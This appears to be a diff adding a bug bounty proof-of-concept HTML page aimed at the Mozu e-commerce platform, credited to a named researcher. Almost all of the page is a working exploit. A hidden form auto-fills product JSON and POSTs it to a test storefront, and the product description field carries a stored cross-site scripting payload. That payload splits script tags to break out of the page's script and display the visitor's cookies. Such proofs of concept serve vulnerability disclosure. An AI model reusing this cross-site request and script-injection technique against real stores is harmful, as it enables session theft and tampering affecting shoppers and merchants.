@@ -1,0 +1,155 @@
+<html>
+<head>
+<title>Mozu PoC</title>
+</head>
+<body>
+<h1>Mozu PoC</h1>
+<pre>
+Researcher Name: Luke Arntson
+Email: arntsonl@gmail.com
+Bugcrowd: ilucipher
+</pre>
+<form action="http://mozupentest1.com/location/product" method="POST">
+	<input type="hidden" name="item" id="hiddenValue" />
+	<input type="submit" value="Click Me"></input>
+</form>
+
+<script>
+	var json = {
+		"mainImage": {
+			"src": "//cdn-sb.mozu.com/11944-16454/cms/16454/files/c1fbbee5-01f2-4763-bbc9-4fcef9d94a7b",
+			"imageLabel": null,
+			"altText": null,
+			"imageUrl": "//cdn-sb.mozu.com/11944-16454/cms/16454/files/c1fbbee5-01f2-4763-bbc9-4fcef9d94a7b",
+			"cmsId": "c1fbbee5-01f2-4763-bbc9-4fcef9d94a7b",
+			"videoUrl": null,
+			"mediaType": null,
+			"sequence": 1
+		},
+		"url": "/p/dr-1002",
+		"hasPriceRange": false,
+		"content": {
+			"productImages": [{
+				"src": "//cdn-sb.mozu.com/11944-16454/cms/16454/files/c1fbbee5-01f2-4763-bbc9-4fcef9d94a7b",
+				"imageLabel": null,
+				"altText": null,
+				"imageUrl": "//cdn-sb.mozu.com/11944-16454/cms/16454/files/c1fbbee5-01f2-4763-bbc9-4fcef9d94a7b",
+				"cmsId": "c1fbbee5-01f2-4763-bbc9-4fcef9d94a7b",
+				"videoUrl": null,
+				"mediaType": null,
+				"sequence": 1
+			}],
+			"productName": "Drop Waist Ruffle Dress",
+			"productFullDescription": "",
+			"productShortDescription": "\n\n\n\n\n\n\n</scr"+"ipt><scr"+"ipt type=\"text/javascript\">alert('your cookie is ' + document.cookie);</scr"+"ipt>",
+			"metaTagTitle": "",
+			"metaTagDescription": "",
+			"metaTagKeywords": "",
+			"seoFriendlyUrl": ""
+		},
+		"categories": [{
+			"url": "/cl/c/2",
+			"categoryId": 2,
+			"content": {
+				"categoryImages": [],
+				"name": "Clothing",
+				"description": "Clothing",
+				"pageTitle": "Clothing",
+				"metaTagTitle": "Clothing",
+				"metaTagDescription": "Clothing",
+				"metaTagKeywords": "Clothing",
+				"slug": "cl"
+			},
+			"childrenCategories": [],
+			"sequence": 2,
+			"isDisplayed": true,
+			"categoryCode": "2",
+			"count": 0
+		}, {
+			"url": "/dresses-jumpsuits/c/9",
+			"categoryId": 9,
+			"content": {
+				"categoryImages": [],
+				"name": "Dresses & Jumpsuits",
+				"description": "Dresses & Jumpsuits",
+				"pageTitle": "Dresses & Jumpsuits",
+				"metaTagTitle": "Dresses & Jumpsuits",
+				"metaTagDescription": "Dresses & Jumpsuits",
+				"metaTagKeywords": "Dresses & Jumpsuits",
+				"slug": "dresses-jumpsuits"
+			},
+			"childrenCategories": [],
+			"parentCategoryId": 2,
+			"sequence": 1,
+			"isDisplayed": true,
+			"categoryCode": "9",
+			"count": 0
+		}],
+		"price": {
+			"price": 119,
+			"priceType": "List",
+			"catalogListPrice": 119
+		},
+		"supportsInStorePickup": true,
+		"productCode": "dr-1002",
+		"productSequence": 16,
+		"productUsage": "Standard",
+		"fulfillmentTypesSupported": ["DirectShip", "InStorePickup"],
+		"goodsType": "Physical",
+		"bundledProducts": [],
+		"purchasableState": {
+			"isPurchasable": true
+		},
+		"isActive": true,
+		"publishState": "Live",
+		"availableShippingDiscounts": [],
+		"productType": "clothing_dress",
+		"productTypeId": 4,
+		"isTaxable": true,
+		"pricingBehavior": {
+			"discountsRestricted": false,
+			"discountsRestrictedStartDate": null,
+			"discountsRestrictedEndDate": null
+		},
+		"inventoryInfo": {
+			"manageStock": false
+		},
+		"createDate": "2013-10-03T23:04:02.493Z",
+		"dateFirstAvailableInCatalog": "2013-10-03T23:04:02.493Z",
+		"daysAvailableInCatalog": 890,
+		"upCs": [],
+		"mfgPartNumbers": [],
+		"measurements": {
+			"packageWeight": {
+				"unit": "lbs",
+				"value": 2
+			}
+		},
+		"properties": [{
+			"attributeFQN": "tenant~availability",
+			"isHidden": false,
+			"isMultiValue": false,
+			"attributeDetail": {
+				"valueType": "Predefined",
+				"inputType": "List",
+				"dataType": "String",
+				"usageType": "Property",
+				"dataTypeSequence": 1,
+				"name": "Availability",
+				"searchableInStorefront": true
+			},
+			"values": [{
+				"value": "2-3weeks",
+				"stringValue": "Usually Ships in 2 to 3 Weeks"
+			}]
+		}],
+		"options": [],
+		"variations": [],
+		"quantity": 1,
+		"priceRange": {}
+	};
+	var hiddenInput = document.getElementById("hiddenValue");
+	hiddenInput.value = JSON.stringify(json).replace(/(\r\n|\n|\r)/gm,"");
+</script>
+</body>
+</html>
